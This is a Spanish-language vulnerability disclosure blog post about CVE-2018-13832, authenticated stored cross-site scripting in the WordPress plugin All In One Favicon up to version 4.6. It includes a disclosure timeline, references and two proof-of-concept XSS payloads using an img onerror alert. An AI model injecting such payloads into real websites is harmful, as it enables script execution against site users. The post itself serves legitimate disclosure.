+++
date = "2018-07-10"
title = "CVE-2018-13832 WordPress Plugin All In One Favicon <= 4.6 - Autenticado MÃºltiples Cross Site Scripting Persistentes"
author = "Javier Olmedo"
toc = false
+++

Durante una de mis auditorias a plugins paraÂ [WordPress](https://es.wordpress.org/), he descubierto varias vulnerabilidades del tipoÂ [Cross Site Scripting Persintente (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\))Â en el pluginÂ [All In One Favicon <= 4.6](https://wordpress.org/plugins/all-in-one-favicon/), desarrollado porÂ [Arne Franken de Techotronic](http://www.techotronic.de/). Esta vulnerabilidad ya fue reportada y ha sido asociada alÂ [CVE-2018-13832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13832).

## WordPress Plugin CVE-2018-13832

### All In One Favicon <= 4.6 â€“ Autenticado MÃºltiples Cross Site Scripting Persistentes

[![/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_001.png](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_001.png)](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_001.png)

- ðŸ“…Â Vulnerabilidad descubierta porÂ [Javier Olmedo](https://twitter.com/JJavierOlmedo)Â elÂ **15/03/2018**
- ðŸ’£ Publicada elÂ **10/07/2018**
- ðŸ›Â **CVE-2018-13832**
- ðŸ”—Â Link del softwareÂ [All In One Favicon](https://wordpress.org/plugins/all-in-one-favicon/)
- ðŸžÂ VersiÃ³n vulnerable <=Â **4.6**
- ðŸ“¥ Instalaciones activasÂ **+100,000**

## Â¿CÃ³mo explotar la vulnerabilidad?

Para explotar esta vulnerabilidad, necesitamos unÂ **usuario con permisos de administraciÃ³n**, los parÃ¡metros vulnerables (8) son los siguientes:

[![/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_002.png](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_002.png)](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_002.png)

Puede explotarse con los siguientes payloads:

```txt
ðŸ’‰ "><img src=a onerror=alert(1)>
ðŸ’‰ "><img src=a onerror=alert(String.fromCharCode(88,83,83))>
```

## Prueba de concepto (POC)

[![/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_003.gif](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_003.gif)](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_003.gif)

## Timeline

- **15/03/2018**Â Informo al desarrollador de la vulnerabilidad (sin contestaciÃ³n) ðŸ˜¥
- **27/05/2018**Â Vuelvo a informar la vulnerabilidad por segunda vez (tambiÃ©n sin contestaciÃ³n) ðŸ˜­
- **08/07/2018**Â Solicito CVE
- **10/07/2018**Â Hago pÃºblica la vulnerabilidad

## Referencias

- CCN CERT â€“Â [https://www.ccn-cert.cni.es/seguridad-al-dia/vulnerabilidades/view/24136.html](https://www.ccn-cert.cni.es/seguridad-al-dia/vulnerabilidades/view/24136.html)
- CVE-MITRE â€“Â [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13832](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13832)
- CVE Details â€“Â [https://www.cvedetails.com/cve/CVE-2018-13832/](https://www.cvedetails.com/cve/CVE-2018-13832/)
- NIST â€“Â [https://nvd.nist.gov/vuln/detail/CVE-2018-13832](https://nvd.nist.gov/vuln/detail/CVE-2018-13832)
- Exploit DB â€“Â [https://www.exploit-db.com/exploits/45056/](https://www.exploit-db.com/exploits/45056/)
- 0Day Today â€“Â [https://es.0day.today/exploits/30752](https://es.0day.today/exploits/30752)
- CX Security â€“Â [https://cxsecurity.com/cveshow/CVE-2018-13832/](https://cxsecurity.com/cveshow/CVE-2018-13832/)
- Packet Storm â€“Â [https://packetstormsecurity.com/files/148617/WordPress-All-In-One-Favicon-4.6-Cross-Site-Scripting.html](https://packetstormsecurity.com/files/148617/WordPress-All-In-One-Favicon-4.6-Cross-Site-Scripting.html)

Un saludo a todos!!Â ðŸ‘‹